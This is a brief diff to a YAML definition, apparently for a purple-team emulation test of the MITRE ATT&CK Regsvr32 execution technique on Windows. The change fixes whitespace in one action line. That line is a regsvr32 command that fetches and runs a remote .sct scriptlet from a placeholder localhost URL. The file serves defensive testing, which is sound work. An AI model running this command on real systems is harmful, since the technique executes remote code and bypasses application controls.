@@ -10,7 +10,7 @@ meta:
   mitre_attack_phase: Execution
   mitre_attack_technique: Regsvr32
   purple_actions:
-    1: cmd.exe /c  regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll
+    1: cmd.exe /c regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll
 os: windows
 name: Regsrv32 Execution Examples
 uuid: 65119a53-e6c1-4072-b5d5-f956e737c5e8
